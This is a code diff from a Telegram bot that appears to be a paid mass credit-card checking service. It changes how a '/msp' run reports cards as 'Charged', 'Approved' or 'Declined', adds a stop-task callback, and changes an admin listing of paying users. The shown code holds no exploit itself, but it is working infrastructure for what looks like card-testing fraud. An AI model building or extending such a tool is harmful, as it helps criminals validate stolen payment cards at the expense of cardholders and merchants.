+        is_stopped = ACTIVE_MTXT_PROCESSES.get(uid, {}).get("stopped", False)
+        stop_label = " (Stopped)" if is_stopped else ""
+        
+        ft = f"""{PE} <b>Complete{stop_label}</b> {PE}
+━━━━━━━━━━━━━━━━━
+{PE} <b>Charged</b> ━ <code>{charged}</code>
+{PE} <b>Approved</b> ━ <code>{approved}</code>
+{PE} <b>Declined</b> ━ <code>{declined}</code>
+{PE} <b>Errors</b> ━ <code>{errors}</code>
+━━━━━━━━━━━━━━━━━
+{PE} <b>Checked</b> ━ <code>{checked}/{total}</code>"""
+
+        fkb = [
+            [pbtn(f"✅ Charged: {charged}", "none"), pbtn(f"⚡ Approved: {approved}", "none")],
+            [pbtn(f"📊 Total: {checked}/{total}", "none"), pbtn(f"⏱ {h}h {m}m {s}s", "none")]
+        ]
+        
+        for _ in range(3):
+            try: await styled_edit(sm, ft, buttons=fkb, emoji_ids=[CE["crown"], CE["crown"], CE["gem"], CE["check"], CE["declined"], CE["warn"], CE["star"]]); break
+            except: await asyncio.sleep(0.5)
+            
+        await send_final_results(uid, total, charged, approved, declined, errors, all_results)
+        ACTIVE_MTXT_PROCESSES.pop(uid, None)
+        
+    except Exception as e: await event.reply(f"⚠️ Error in /msp: {e}")
 
 @client.on(events.CallbackQuery(pattern=rb"stop_chk:(\d+)"))
 async def stop_chk_cb(event):
@@ -1021,10 +1013,9 @@ async def stop_chk_cb(event):
     if event.sender_id != puid and event.sender_id not in ADMIN_ID: return await event.answer("Not yours!", alert=True)
     proc = ACTIVE_MTXT_PROCESSES.get(puid)
     if not proc: return await event.answer("None active!", alert=True)
-    if isinstance(proc, dict):
-        proc["stopped"] = True
-        for t in proc.get("tasks", []):
-            if not t.done(): t.cancel()
+    proc["stopped"] = True
+    for t in proc.get("tasks", []):
+        if not t.done(): t.cancel()
     await event.answer("Stopping...", alert=True)
 
 # ====================== COMMANDS (ADMIN) ======================
@@ -1080,8 +1071,8 @@ async def planall_cmd(event):
     try:
         async with DB_LOCK_MAIN:
             with open("database.json", "r", encoding="utf-8") as f:
-                data_json = json.loads(await f.read())
-                for uid_s, u_doc in data_json.get("users", {}).items():
+                ddata = json.load(f)
+                for uid_s, u_doc in ddata.get("users", {}).items():
                     if u_doc.get("plan") in PAID_TIERS: all_users.append(u_doc)
     except: pass
     if not all_users: return await styled_reply(event, f"{PE} <b>No active plans</b>", emoji_ids=[CE["warn"]])
